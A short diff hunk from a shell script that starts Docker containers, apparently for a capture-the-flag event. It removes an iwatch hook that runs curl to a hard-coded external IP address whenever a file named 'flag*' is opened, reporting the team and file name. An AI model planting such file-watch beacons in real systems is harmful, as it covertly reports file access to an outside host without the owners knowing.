@@ -130,6 +130,3 @@ do
 done
 docker exec -d t10_ap /go.sh
 
-#finally run iwatch
-TEAM=$(cat /team)
-iwatch -e open -t "flag*" -c "curl http://144.126.214.134:8000/getit?team=t${TEAM}_\`basename %f\`" .
